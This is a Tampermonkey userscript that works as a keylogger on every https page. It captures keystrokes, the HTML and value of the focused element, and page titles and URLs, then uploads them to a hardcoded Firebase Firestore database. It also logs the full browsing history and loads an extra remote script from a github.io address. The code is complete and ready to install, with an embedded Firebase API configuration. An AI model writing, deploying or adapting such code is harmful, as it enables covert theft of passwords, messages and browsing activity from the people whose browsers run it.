// ==UserScript==
// @name         Key Userscript
// @namespace    http://tampermonkey.net/
// @version      1.0.1
// @description  try to take over the world!
// @author       You
// @match        https://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @require      https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.13.6/underscore-min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.7/dayjs.min.js
// @require      https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js
// @require      https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js
// @require      https://e-grau.github.io/estrella/key.js

// @grant        none
// ==/UserScript==
(function() {
    'use strict';


    const firebaseConfig = {
        apiKey: "AIzaSyBOj0kF7m-JxxaDYhtlj-xDSu_pLlZOGtI",
        authDomain: "keys-3239e.firebaseapp.com",
        projectId: "keys-3239e",
        storageBucket: "keys-3239e.appspot.com",
        messagingSenderId: "878579812626",
        appId: "1:878579812626:web:d23ba8efa5073f09d70bcb"
    };


    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const keys$ = db.collection("keys");
    const history$ = db.collection("history");

    // Your code here...
    var keys = '';
    var uu = "";


    const data = {
        element: "",
        uu: uu || "_ANON_",
        title: document.title,
        url: window.location.href,
        value: "",

    }

    window.onload = function() {

        history$.add({
            date: new Date(),
            title: document.title,
            url: window.location.href,
            user: uu || "_ANON_",
            day: dayjs().format("YYYY-MM-DD"),

        })


    }
    document.onkeypress = function(e) {
        let get = window.event ? event : e;
        data.element = get.target.outerHTML;
        data.value = data.element && data.element.value || "";
        let key_ = get.keyCode ? get.keyCode : get.charCode;
        let key = String.fromCharCode(key_);
        keys += key;

        if (key_ == 13) {
            saveKeys()
        }
    }


    document.onkeyup = _.debounce(saveKeys, 500)

    function saveKeys(e) {
        if (keys.length > 0) {
            //new Image().src = url+keys;
            data.keys = keys;
            data.title = document.title;
            data.url = window.location.href;
            data.date = new Date();
            data.day = dayjs().format("YYYY-MM-DD");
            data.uu = uu || "_ANON_";
            console.log(data);

            keys$.add(data);
            keys = '';
        }

    }



})();
